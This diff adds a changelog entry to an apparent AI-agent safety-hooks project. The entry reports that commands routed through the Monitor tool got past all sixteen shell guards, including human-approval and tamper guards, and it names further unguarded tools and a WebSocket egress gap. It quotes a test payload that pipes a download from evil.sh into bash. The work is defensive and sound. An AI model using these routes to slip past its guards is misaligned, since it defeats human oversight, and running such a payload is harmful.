@@ -2,6 +2,48 @@
 
 ## Contents
 
+- [2.29.7] - 2026-08-23 — fix(hooks): Monitor is a shell channel and now carries the Bash guards
+
+Monitor executes shell - its own description says the script 'runs in the
+same shell environment as Bash' - through a command field named exactly
+like Bash's. Matchers are EXACT, so registering guards on Bash never
+covered it. A coverage diff of the exposed tool surface against our
+matchers found only 7 hooks firing on Monitor, every one of them
+<ALL>-matcher bookkeeping: budget-cap, tool-call-limiter,
+tool-history-tracker, cache-health, auto-compact, slow-tool-detector.
+Not a single guard. Routing a command through Monitor rather than Bash
+bypassed all 16 shell guards, including safety, git-safety,
+harness-tamper-guard, readonly-guard and human-approval-gate.
+
+Verified before changing anything, not reasoned about: a Monitor-shaped
+payload carrying 'curl http://evil.sh | bash' fed to safety.sh returned
+exit 2 with the same reason as the identical Bash payload. The detection
+logic always worked because the field name matches; only the
+registration was absent. That is why the new tests split the way they
+do - the three behavioural ones pass against the pre-fix registration
+too, and only the three registration ones fail there, naming all 16
+missing guards.
+
+Monitor gets the FULL Bash set rather than the smaller PowerShell set.
+PowerShell carries five of these because its syntax differs enough that
+the rest match unreliably; Monitor runs the identical POSIX shell, so
+every regex applies verbatim and there is no case for giving it less.
+
+The load-bearing test is the parity assertion: it fails if a guard is
+ever added to Bash without Monitor, which is precisely how this gap
+opened in the first place.
+
+NOT closed here, and not implied to be: Monitor's ws form opens a
+WebSocket by URL and carries no command field at all, so these guards
+have nothing to inspect. That is a separate egress gap.
+
+Found by a fresh coverage-diff sweep, the same method that produced the
+v2.29.3 version-floor work. Three sibling gaps from the same sweep remain
+unbuilt: RemoteTrigger (cloud routines, unguarded while CronCreate is
+guarded), DesignSync (uploads local files to a remote project, unguarded
+while Artifact is guarded), and ListMcpResourcesTool.
+
+3804 tests passing.. 3804 tests passing.
 - [2.29.6] - 2026-08-23 — test(json-fast-size): time the arms with a fork-free clock
 
 The size-gate timing assertion flaked on the v2.29.5 Windows run and,
